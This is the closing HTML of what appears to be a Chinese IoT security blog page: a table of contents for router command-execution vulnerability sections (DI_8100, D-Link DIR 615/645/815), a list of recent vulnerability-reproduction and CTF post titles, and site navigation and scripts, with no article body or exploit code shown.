class="toc-number">1.4.</span> <span class="toc-text">简单调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DI-8100%E7%9A%84%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">DI_8100的第二个命令执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#D-Link-DIR-615-645-815-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">D-Link DIR 615&#x2F;645&#x2F;815 命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">2.1.</span> <span class="toc-text">固件下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/" title="qemu搭建ARM64环境">qemu搭建ARM64环境</a><time datetime="2025-07-13T16:00:00.000Z" title="发表于 2025-07-14 00:00:00">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="IOT入门--路由器命令执行漏洞">IOT入门--路由器命令执行漏洞</a><time datetime="2025-07-12T16:00:00.000Z" title="发表于 2025-07-13 00:00:00">2025-07-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-17215 华为HG532路由器RCE漏洞复现">CVE-2017-17215 华为HG532路由器RCE漏洞复现</a><time datetime="2025-07-11T16:00:00.000Z" title="发表于 2025-07-12 00:00:00">2025-07-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/" title="DIR-815 栈溢出漏洞(CNVD-2013-11625)复现">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</a><time datetime="2025-06-13T16:00:00.000Z" title="发表于 2025-06-14 00:00:00">2025-06-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/13/2025%20ISCC%20%E7%BB%83%E6%AD%A6%E8%B5%9BPwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/" title="2025 ISCC 练武赛Pwn-wp(含附件)">2025 ISCC 练武赛Pwn-wp(含附件)</a><time datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/yu2.png);"><div id="footer-wrap"><div class="footer_custom_text">Let yourself go</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="(。・＿・。)ﾉ你好呀，希望博客里面的内容可以帮助到你" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>